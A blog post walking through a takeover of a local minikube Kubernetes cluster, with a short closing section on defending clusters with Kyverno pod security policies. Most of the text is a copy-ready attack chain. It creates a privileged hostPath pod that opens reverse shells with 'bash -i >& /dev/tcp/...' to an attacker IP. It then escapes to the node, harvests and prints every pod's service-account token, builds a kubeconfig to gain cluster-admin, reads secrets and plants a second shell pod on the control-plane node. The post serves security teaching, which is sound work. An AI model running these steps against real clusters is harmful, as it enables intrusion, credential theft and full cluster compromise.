+++
title = 'Pwning Kubernetes'
date = 2024-06-10T00:39:07-07:00
+++

Kubernetes is insecure by default! Let's Pwn it to make a Pwoint (see what I did there?) 😜.

<!--more-->

## TL;DR 📚

- Start with a privileged pod with host file system access 🖥️
- Open a reverse shell to our attack machine 🐚
- Escape the container to pwn the node 🏃
- Steal all the pods' tokens 🗝️
- Escalate privilege to cluster-admin 📈
- Steal all the secrets 🕵️
- Deploy your pods on every node 📡
- All your cluster are belong to us! 👾
- Defending your cluster 🛡️

## The Victim 🥺

We will attack a local minikube cluster. Everything applies to Kubernetes clusters in the cloud (
but, KinD and K3D are different).

```shell
❯ minikube start -n 2
😄  minikube v1.33.1 on Darwin 14.1 (arm64)
✨  Automatically selected the docker driver
📌  Using Docker Desktop driver with root privileges
👍  Starting "minikube" primary control-plane node in "minikube" cluster
🚜  Pulling base image v0.0.44 ...
💾  Downloading Kubernetes v1.30.0 preload ...
    > preloaded-images-k8s-v18-v1...:  319.81 MiB / 319.81 MiB  100.00% 20.29 M
    > gcr.io/k8s-minikube/kicbase...:  435.76 MiB / 435.76 MiB  100.00% 17.74 M
🔥  Creating docker container (CPUs=2, Memory=4600MB) ...
🐳  Preparing Kubernetes v1.30.0 on Docker 26.1.1 ...
    ▪ Generating certificates and keys ...
    ▪ Booting up control plane ...
    ▪ Configuring RBAC rules ...
🔗  Configuring CNI (Container Networking Interface) ...
🔎  Verifying Kubernetes components...
    ▪ Using image gcr.io/k8s-minikube/storage-provisioner:v5
🌟  Enabled addons: storage-provisioner, default-storageclass

👍  Starting "minikube-m02" worker node in "minikube" cluster
🚜  Pulling base image v0.0.44 ...
🔥  Creating docker container (CPUs=2, Memory=4600MB) ...
🌐  Found network options:
    ▪ NO_PROXY=192.168.49.2
🐳  Preparing Kubernetes v1.30.0 on Docker 26.1.1 ...
    ▪ env NO_PROXY=192.168.49.2
🔎  Verifying Kubernetes components...
🏄  Done! kubectl is now configured to use "minikube" cluster and "default" namespace by default
```

## The juicy target 🍊

An empty cluster is not exactly fascinating. Let's deploy a workload with `cluster-admin`
permissions.
This will be a worthy goal. To make it easy let's make it a daemonset. That means that it will be
running on every worker node in the cluster. We will see later why it's significant and how it makes
the life of an attacker that much easier.

The following commands create a service account and a cluster role binding that are both
called `juicy`. The cluster role binding binds the `cluster-admin` role to the service account.
Finally, it creates a daemonset (imaginatively also called juicy) where the pods use our service
account.

```shell
k create sa crown-jewel
k create clusterrolebinding crown-jewel \
 --clusterrole=cluster-admin --serviceaccount=default:juicy
 
echo '
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: juicy
  namespace: default
spec:
  selector:
    matchLabels:
      name: juicy
  template:
    metadata:
      labels:
        name: juicy
    spec:
      serviceAccountName: juicy
      containers:
      - name: juicy-container
        image: registry.k8s.io/pause:3.9
' | k create -f -
```

For good measure let's also create a secret called `top-secret` with DB credentials and cloud
provider credentials.

```
k create secret generic top-secret \
  --from-literal=aws-access-key-id='<redacted>' \
  --from-literal=aws-secret-access-key='<redacted>' \
  --from-literal=gcp-service-account='<redacted>' \
  --from-literal=postgres-endpoint=1.2.3.4    \
  --from-literal=postgres-username=the-user   \
  --from-literal=postgres-password=the-password
```

## Foot in the Door 🦶🚪

We want to escape the container, which means first we need to get our container to run in a pod
scheduled on some node of the target cluster. This part I leave to you - social engineering, supply
chain attack, image registry poisoning, etc.

We will simulate it by directly creating a pod with an image that starts a reverse shell. But, first
we need to open a terminal on the attacker machine listening for the reverse shell connection. The
following netcat command will block initially:

```
❯ nc -lv 7444
```

In another terminal window let's launch our attack pod and instruct it to open a reverse shell
connection to our local IP address (where netcat is listening) on port 7444:

```
> echo $(ifconfig | rg 'inet .* broadcast' | awk '{print $2}')
192.168.68.51
```

```shell
echo '
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: test-container
    image: g1g1/py-kube
    securityContext:
      privileged: true

    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false
    command: 
    - bash 
    - -c
    - "bash -i >& /dev/tcp/192.168.68.51/7444 0>&1"
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
' | k create  -f -
```

Note the command for opening the reverse shell: `bash -i >& /dev/tcp/192.168.68.51/7444 0>&1`

## Escaping the container 🏃‍

When our test-pod is scheduled and executes the command on the victim node the terminal listening
on port 7444 will come alive:

```shell
❯ nc -lv 7444
root@minikube-m02:/#
```

We have mounted the host node root file system into /root in our pod, which means we can explore the
node's
file system and check all the other pods running on the same node:

```shell
root@minikube-m02:~# cd /host/var/lib/kubelet/pods 

root@minikube-m02:/host/var/lib/kubelet/pods# tree
.
├── 13dd8eaa-2d79-446c-b0b7-c4ca06508bfb
│     ├── containers
│     │     └── kindnet-cni
│     │         └── 95b63843
│     ├── etc-hosts
│     ├── plugins
│     │     └── kubernetes.io~empty-dir
│     │         └── wrapped_kube-api-access-fdhcn
│     │             └── ready
│     └── volumes
│         └── kubernetes.io~projected
│             └── kube-api-access-fdhcn
│                 ├── ca.crt -> ..data/ca.crt
│                 ├── namespace -> ..data/namespace
│                 └── token -> ..data/token
├── 2c1ff265-dcf9-47a4-8262-cf6f0636ec9e
│     ├── containers
│     │     └── test-container
│     │         └── 0065b5b0
│     ├── etc-hosts
│     ├── plugins
│     │     └── kubernetes.io~empty-dir
│     │         └── wrapped_kube-api-access-p98sm
│     │             └── ready
│     └── volumes
│         └── kubernetes.io~projected
│             └── kube-api-access-p98sm
│                 ├── ca.crt -> ..data/ca.crt
│                 ├── namespace -> ..data/namespace
│                 └── token -> ..data/token
├── 2d502923-a155-484e-9278-0813a9d8563c
│     ├── containers
│     │     └── juicy-container
│     │         └── 5d95a263
│     ├── etc-hosts
│     ├── plugins
│     │     └── kubernetes.io~empty-dir
│     │         └── wrapped_kube-api-access-6trk2
│     │             └── ready
│     └── volumes
│         └── kubernetes.io~projected
│             └── kube-api-access-6trk2
│                 ├── ca.crt -> ..data/ca.crt
│                 ├── namespace -> ..data/namespace
│                 └── token -> ..data/token
└── adce9444-9af3-4254-a74a-4f0d65596604
    ├── containers
    │     └── kube-proxy
    │         └── b3c9038f
    ├── etc-hosts
    ├── plugins
    │     └── kubernetes.io~empty-dir
    │         ├── wrapped_kube-api-access-tlrvk
    │         │     └── ready
    │         └── wrapped_kube-proxy
    │             └── ready
    └── volumes
        ├── kubernetes.io~configmap
        │     └── kube-proxy
        │         ├── config.conf -> ..data/config.conf
        │         └── kubeconfig.conf -> ..data/kubeconfig.conf
        └── kubernetes.io~projected
            └── kube-api-access-tlrvk
                ├── ca.crt -> ..data/ca.crt
                ├── namespace -> ..data/namespace
                └── token -> ..data/token
```

Each branch represents a pod and its containers. The volumes sub-branch contains all the volumes
mounted into the pod. The projected volumes contain a token leaf. This token corresponds to the
service account of the pod. It will allow us (the attacker) to access the cluster with the
permissions of each pod.

### Exfiltrate all the tokens 📥

Alright, let's exfiltrate these coveted tokens!

```
root@minikube-m02:/host/var/lib/kubelet/pods# find . -type l -name 'token' | while read -r token_file; do
    # Print the contents of each token file, each token on a new line
    cat "$(readlink -f "$token_file")" | tr ' ' '\n'
    echo
    echo ---
done

eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhZ3BKckVkYUVWSUJwUERmeVBGNVN5NXk5VXN0Q1REUk9GZ01pWkl5dzgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQ5NDA5NTIwLCJpYXQiOjE3MTc4NzM1MjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMTU0YjBhMWMtZTI1ZC00MjY5LWFjZTAtOWMyMWI4NWZiY2NmIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoibWluaWt1YmUtbTAyIiwidWlkIjoiNjZiMjNlZGItMzViZS00MTU0LWJmYzQtMDZjYjgzNzg1MjYwIn0sInBvZCI6eyJuYW1lIjoidGVzdC1wb2QiLCJ1aWQiOiIyYzFmZjI2NS1kY2Y5LTQ3YTQtODI2Mi1jZjZmMDYzNmVjOWUifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiJiYWI3OTZlZC03YmRhLTQzMzctOWM2NS1hZDdiZTdjY2QyODAifSwid2FybmFmdGVyIjoxNzE3ODc3MTI3fSwibmJmIjoxNzE3ODczNTIwLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpkZWZhdWx0In0.DHAaN_gZGp9TszVR2LiRkiCdGmUhjSR88Yg27brWmw-AAh9id-bvmls0e86oRVb6Skq6GuGyT9RstwUInCwWZwpJ0TRNzm67qI979t0YL0vEM9mgfYh-sWMQ8AtdF-TPWxNLyMW8IQgEMceNvu_m-eGVjTCWGtuPcxQqAHeGrKMmF4OMsc98M6nd8WePVaasLaNYLWMt3ute3YWvjsuKbHNCkUsLqyz0tyqkm81jbKyBOu8VcaJqlrx4PNKKHfZ5Y58Pnr0kau5TF_6tT2vTZKHL3o6-glHs9H2jYChBolryNCT1MBWwX2oAW_SC_GBZdLn1PwVloD2ELYBJ4LRWsg
---
eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhZ3BKckVkYUVWSUJwUERmeVBGNVN5NXk5VXN0Q1REUk9GZ01pWkl5dzgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQ5NDA5ODk1LCJpYXQiOjE3MTc4NzM4OTUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiODFmYTJjMjctZjRhOC00NTJhLThmNTQtYWZmYzE3NTBjNjhiIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsIm5vZGUiOnsibmFtZSI6Im1pbmlrdWJlLW0wMiIsInVpZCI6IjY2YjIzZWRiLTM1YmUtNDE1NC1iZmM0LTA2Y2I4Mzc4NTI2MCJ9LCJwb2QiOnsibmFtZSI6ImtpbmRuZXQtamQ3cGsiLCJ1aWQiOiIxM2RkOGVhYS0yZDc5LTQ0NmMtYjBiNy1jNGNhMDY1MDhiZmIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImtpbmRuZXQiLCJ1aWQiOiIyNGNiYTIyNi0zZjczLTRhYjItYWUzYS0xODdjZjk5YmViNWYifSwid2FybmFmdGVyIjoxNzE3ODc3NTAyfSwibmJmIjoxNzE3ODczODk1LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06a2luZG5ldCJ9.a5vRwwAN6dvFv4z3W25ZRopjT4Y1FS6g7wZEypE5XwFsRQdUnmca5ZKE4i0AkxVE14qY_5YmI7Xy2RCBSR9Ro_PnjidL7_5eMg6lBuFh6F1GxTXf3rLOx1undOm4CgJc73Hy5kmhR_7oH1qKhIR8vV7mIrvN9bZd74-WOMgeUpK2DK_nEpKxG9eupzSEiUubWB6wQqnIDLusDTNHFbp853Vsp9a8dV13msR-SlfhU-3Mn7fhpDOA088c7OeKaRJPyVlri97XQ02d9Va7gsd0CYsX2mtJTm_4VXxyrXHcvigNoV5Dv9UA-tdI16JDCvCB1tcSCks6uc-J0NrIxu7RdQ
---
eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhZ3BKckVkYUVWSUJwUERmeVBGNVN5NXk5VXN0Q1REUk9GZ01pWkl5dzgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQ5NDA2OTY4LCJpYXQiOjE3MTc4NzA5NjgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZDY3ZWYzZWItYjVjYy00YmEwLWFjZmYtMjc4ZmZhNjI5ODIyIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsIm5vZGUiOnsibmFtZSI6Im1pbmlrdWJlLW0wMiIsInVpZCI6IjY2YjIzZWRiLTM1YmUtNDE1NC1iZmM0LTA2Y2I4Mzc4NTI2MCJ9LCJwb2QiOnsibmFtZSI6Imt1YmUtcHJveHktcWIybmwiLCJ1aWQiOiJhZGNlOTQ0NC05YWYzLTQyNTQtYTc0YS00ZjBkNjU1OTY2MDQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Imt1YmUtcHJveHkiLCJ1aWQiOiJiNzc2ZTc3Yy05Y2EyLTQ2MDAtYmIyMS01NDE3MTE4NmFlODMifSwid2FybmFmdGVyIjoxNzE3ODc0NTc1fSwibmJmIjoxNzE3ODcwOTY4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06a3ViZS1wcm94eSJ9.AkQaslASTzK-c9mLAEcG6VLD9apxJxyZmRNAwJ98idCeFfpmDEwMpeGljMYGlD_aPm1_94ZtAwbNDADdDQoQXRhi2vQ2w69-i-e_ASnS_sOhgFhVa26FPhxCK1XQcIgG1n5YJ8fHKG5Vqb3tmP7xL1yiBk470baN0IvWWsz2Y8iBWmgvrKEyq0jKcfF36GQ0qb2wkWDpOsEnLBFxTTWFEG-_HWw83Cd_ur1fj_Ku93boDVNXEj3kSApvy8O7I9YeBGTjeyRL6NElyNoamvfVU4az8KflB7cyI-B_B-7YoZU16YNBjXwIRQabhrjYYfbfvY_VNwd1OBSMxllgEnM6Mg
---
eyJhbGciOiJSUzI1NiIsImtpZCI6IjdhZ3BKckVkYUVWSUJwUERmeVBGNVN5NXk5VXN0Q1REUk9GZ01pWkl5dzgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQ5NDA5MjE5LCJpYXQiOjE3MTc4NzMyMTksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZGYxMGQwNmMtM2EwMC00MDRkLTk4OTEtNzk3ODU3YmFmNTA3Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoibWluaWt1YmUtbTAyIiwidWlkIjoiNjZiMjNlZGItMzViZS00MTU0LWJmYzQtMDZjYjgzNzg1MjYwIn0sInBvZCI6eyJuYW1lIjoianVpY3ktcnQ1OGQiLCJ1aWQiOiIyZDUwMjkyMy1hMTU1LTQ4NGUtOTI3OC0wODEzYTlkODU2M2MifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Imp1aWN5IiwidWlkIjoiYjA5YmJkOGMtMDc5ZC00YWRiLWEzYzEtMzliZjg4OTM0OWQ2In0sIndhcm5hZnRlciI6MTcxNzg3NjgyNn0sIm5iZiI6MTcxNzg3MzIxOSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6anVpY3kifQ.KDF9RqUPYOkMmmOvvJPR5FvSwzWRlYhCw4LL_IZMvQfIixLUFbttpA2W9OX-TINMLnKimuW6SvB1C8r6O0T2PlGSqAhziMndTQ3_fVgrgFBs-oSXQ1bqaLpO9DaVmptnbYuGpHkQEN6saxh4tuyDIeHrSFVHv4i8-ZUACRhQQiRf2fQQEk1hIu9bLGFt75XV2hTE1bsARfGiXKh0zbqDaVNQjQ5weEw9nS48Ov4pcFTzpVrKJfQ1WZMVRx8nSA-pryWjKd16QSINdiBlG0iTi-BQf4-uB6RAHlthyMlWMTY0cT_1QGqnpqmNUY0TkWc5xdoS83Kjvzu_540FKS5NeQ
---
```

Great we captured all the tokens. We can use them to access the Kubernetes API server through its
REST API and pass an exfiltrated token as Authorization Bearer token. But, there's a more elegant
way that will allow us to access the cluster using tools like kubectl and programmatically via SDKs.

### Create a kubeconfig file for the juicy pod 📄

We can create a kubeconfig file that contains the token we extracted from the juicy pod. If you
recall we created a juicy daemonset earlier. It ensures that it doesn't matter on which node our
attack pod ends up because there will always be a juicy pod available to exfiltrate its token and
create a kubeconfig file.

Here is how to create such a file:

```
API_SERVER="$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
TOKEN=$(cat 2d502923-a155-484e-9278-0813a9d8563c/volumes/kubernetes.io~projected/kube-api-access-6trk2/token)

cd 

echo "apiVersion: v1
kind: Config
clusters:
- cluster:
    server: https://$API_SERVER
    insecure-skip-tls-verify: true
  name: cluster
contexts:
- context:
    cluster: cluster
    user: user
  name: context
current-context: context
users:
- name: user
  user:
    token: $TOKEN" > juicy-config
```

Note that this file can be used only inside the cluster where $KUBERNETES_SERVICE_HOST points to a
reachable IP address.

### What about the kubelet credentials? 🔑🐳

The kubelet is a Kubernetes component that runs on every node and interacts with the Kubernetes API
server. It has its own kubeconfig file available at `/etc/kubernetes/kubelet.conf` on the host. This
file references the `/var/lib/kubelet/pki/kubelet-client-current.pem` file.

The attacker can exfiltrate these files too and communicate with the Kubernetes API server as if
they were the kubelet. This sounds powerful, but it turns out that the powers of the kubelet as far
as the API server is concerned are very limited. All the write operations are restricted to the node
the kubelet is running on. Kubernetes has a dedicated authorization mode specifically for this task.
See [Using Node Authorization](https://kubernetes.io/docs/reference/access-authn-authz/node/).

### Privilege Escalation ⬆️🔐

OK. Forget about the kubelet, back to our `juicy-config` kubeconfig file. Let's see how we can use
it
to escalate our privileges in the cluster.

First, let's check our current permissions using the `kubectl auth can-i --list command`

```shell
kubectl auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
```

This list means we have minimal privileges. Definitely we can't create pods or read secrets.

However, if we use the `juicy-config` file we just created the picture is totally different:

```shell
root@minikube-m02:~# kubectl auth can-i --list --kubeconfig juicy-config | \
  grep -E 'Resources|\[\*\]'

Resources        Non-Resource URLs     Resource Names   Verbs
*.*              []                    []               [*]
                 [*]                   []               [*]
```

This means we can use any verb on any resource! The cluster is pwned!

### Lateral Movement ↔️🚶‍

With the `cluster-admin` permissions we can do a lot! Remember that we need to operate in our
reverse shell because the `juicy-config` file refers to the cluster by its internal IP address.

```shell
root@minikube-m02:~#
```

First, let's get all the nodes

```shell
k get no -A --kubeconfig juicy-config | awk '{print $1, $2, $3}' | column -t

NAME          STATUS  ROLES
minikube      Ready   control-plane
minikube-m02  Ready   <none>
```

Next, let's run a privileged pod on another the other node and open another reverse shell to the
attacker machine (need to run netcat to listen `nc -lv 7445`).

```shell
echo '
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
spec:
  nodeName: minikube
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwn-container
    image: g1g1/py-kube
    securityContext:
      privileged: true

    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false
    command: 
    - bash 
    - -c
    - "bash -i >& /dev/tcp/192.168.68.51/7445 0>&1"
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
' | kubectl create  --kubeconfig juicy-config -f -
```

Typically, when you create a new pod directly or via deployment you let the Kubernetes scheduler
figure out which is the best node to place the pod on. But, in this case we want to schedule the pod
to a specific node. We accomplish that by specifying the `nodeName: minikube` field of the spec.

To make life easier, we can bind the `cluster-admin` role directly to the default service account in
the `default` namespace, which is the service account our pods use. This way we don't need to use
the `juicy-config` kube config file anymore.

```shell
root@minikube-m02:~# k create clusterrolebinding default-admin \
 --clusterrole=cluster-admin --serviceaccount=default:default \
 --kubeconfig juicy-config
 
 clusterrolebinding.rbac.authorization.k8s.io/default-admin created 
```

Let's confirm by getting all the secrets without `juicy-config`.

```shell
root@minikube-m02:~# k get secrets
kubectl get secrets
NAME         TYPE     DATA   AGE
top-secret   Opaque   5      85m
```

Now, we can look at our second reverse shell (listening on port 7445). As you can see it is
connected to the other node `minikube` and it has `cluster-admin` privileges (as well as host
access):

```shell
root@minikube:/# k auth can-i --list | grep -E 'Resources|\[\*\]'
Resources  Non-Resource URLs       Resource Names   Verbs
*.*        []                      []               [*]
           [*]                     []               [*]
```

Note that if gain access to secrets with cloud credentials or kubeconfig for other clusters we can
use them for lateral movement beyond the current LKubernetes cluster.

### All your cluster are belong to us! 👾

This is total domination. We can run privileged pods with host filesystem access and cluster-admin
permissions on any node in the cluster.

OK. But, what if there are no juicy pods with `cluster-admin` on the node we took over with? How do
we escalate our privileges?

First, we don't need to immediately jump to `cluster-admin` in one go. There are plenty of
permissions that will allow us to eventually get to `cluster-admin`.

Once we conquered one node we can use its kubelet credentials to do reconnaissance and get all the
nodes and pods in the cluster.

Now, we can take two approaches to gain access to pods with elevated permissions:

1. We can create privileged pods on other nodes.
2. We can bring pods with elevated permissions to our node.

For approach #1 we need obviously need permissions to create pods, directly or indirectly. For
approach #2 we need to be able to evict pods from other nodes or manipulate their controllers (
deployment, stateful set) or installed a mutating admission controller.

### Defending your Kubernetes Clusters 🛡️

Pwning clusters is all fun and games unless you're the poor administrator whose cluster is getting
pwned! There is a very simple solution - don't allow the creation of privileged pods with hostpath
access. This is easier said than done. It turns out that there are valid reasons for such pods and
some 3rd party applications are designed to create pods.

The systematic way to prevent such pods is to install a validating admission controller that
automatically rejects pods that don't comply at least with the baseline pod security standards as
defined by Kubernetes:
https://kubernetes.io/docs/concepts/security/pod-security-standards/#baseline

I'm a big fan of [Kyverno](https://kuverno.io) for these tasks. You can protect your cluster with a
single policy for activating the baseline security profile:

```
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: podsecurity-subrule-baseline
  annotations:
    policies.kyverno.io/description: >-
      The baseline profile of the Pod Security Standards is a collection of the
      most basic and important steps that can be taken to secure Pods. Beginning
      with Kyverno 1.8, an entire profile may be assigned to the cluster through a
      single rule. This policy configures the baseline profile through the latest
      version of the Pod Security Standards cluster wide.      
spec:
  background: true
  validationFailureAction: audit
  rules:
  - name: baseline
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      podSecurity:
        level: baseline
        version: latest
```

See https://kyverno.io/policies/pod-security/subrule/podsecurity-subrule-baseline/podsecurity-subrule-baseline/
for more info.

### Take Home Points 🏠

By default, Kubernetes allows anyone who can create pods to potentially take over the entire cluster.

First, be very mindful about who can create pods on your cluster.

Second, consider introducing a policy engine like Kyverno to prevent pods from requesting
elevated permissions unless they really need them to perform their job.
